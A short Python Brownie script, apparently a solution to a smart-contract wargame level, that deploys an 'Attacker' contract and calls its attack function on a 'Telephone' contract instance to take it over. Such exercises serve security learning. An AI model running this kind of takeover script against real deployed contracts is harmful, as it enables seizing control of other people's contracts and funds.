from brownie import Contract, accounts, Telephone, Attacker

INSTANCE_ADDRESS = "0xD9d62C1b61afD8Dd0EDd06b645A2eD02E4Dd256B"
ACCOUNT = "straul"

def get_account():
    account = accounts.load(ACCOUNT)
    return account

def hack_telephone(account):
    telephone = Contract.from_abi(name="Telephone", address=INSTANCE_ADDRESS, abi=Telephone.abi)

    attacker = Attacker.deploy({'from': account})
    attacker.attack(telephone.address, {'from': account})


def main():
    account = get_account()
    hack_telephone(account)